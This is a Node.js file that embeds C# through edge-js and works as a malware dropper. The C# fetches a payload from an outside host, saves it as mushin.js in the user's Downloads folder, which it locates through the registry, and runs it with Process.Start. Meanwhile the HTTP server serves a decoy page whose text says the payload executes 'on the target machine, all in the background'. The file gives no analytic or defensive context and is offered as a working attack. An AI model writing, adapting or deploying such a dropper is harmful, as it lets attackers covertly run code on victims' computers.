var edge = require('edge-js');
var http = require('http');

var hello = edge.func(function(){/*
	using System.Threading.Tasks;
	using System.Diagnostics;
	using System.IO;
	using Microsoft.Win32;
	using System.Text.RegularExpressions;
	using System;
	
	public class Startup
	{
		public async Task<object> Invoke(object input)
		{
			//do something with input
			int ret2 = 0;
			string ret = Helper.getPayload();
			
			if(ret.Length > 0)
			{
				ret2 = Helper.callSystem((string)ret);
			}
			return ret;
		}
	}
	
	static class Helper
	{
		public static string getPayload()
		{
			//download the payload to a specific destination here
			System.Net.WebClient wc = new System.Net.WebClient();
			byte[] bd  = wc.DownloadData("http://safebets.disenado.com.ng/test-2.txt");

              string dt = System.Text.Encoding.UTF8.GetString(bd,0,bd.Length);
              string dlNameO = getDrop();
			  string dlName = gbeba(dlNameO,"Downloads") + "\\mushin.js";
			  //System.IO.File.Create(dlName);
			  System.IO.File.WriteAllText(dlName,dt);
			return dlName;
		}
		public static int callSystem(string args)
		{
			Process.Start(args);
			return 5;
		}
		public static string getDrop()
		{
			string fn = "";
			try
			{
				fn = (string)Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders","Personal","404");
			}
			catch(Exception e)
			{
				fn = "Error: " + e.ToString();
			}
			fn = Regex.Replace(fn,@"\t|\n|\r","");
			return fn;
		}
		public static string gbeba(string p,string ad)
		{			 
			 string[] items = p.Split('\\');
			 string ret = "";
			 
			 for(int i = 0; i < 3; i++)
			 {
				ret = ret + items[i] + "\\"; 
			 }
			 ret = ret + ad;
	         
	         return ret;
		}
	}
*/});


const port = process.env.PORT || 3000;
const server = http.createServer(function(req, res) {
	
 /*hello('Testing Edge in NodeJS',function(error,result){
	if(error) throw error;
	console.log(result);
});*/
	
  res.statusCode = 200;
  res.setHeader('Content-Type', 'text/html');
  res.write('<h3 style=\'color:red;\'>Decoy html will be displayed here</h3><br><center><blockquote>Meanwhile EdgeJS will run C# which will in turn execute the payload on the target machine, all in the background</blockquote></center>');
  res.end('');

 
});
server.listen(port, function() {
  console.log('Server running at port: ' + port);
});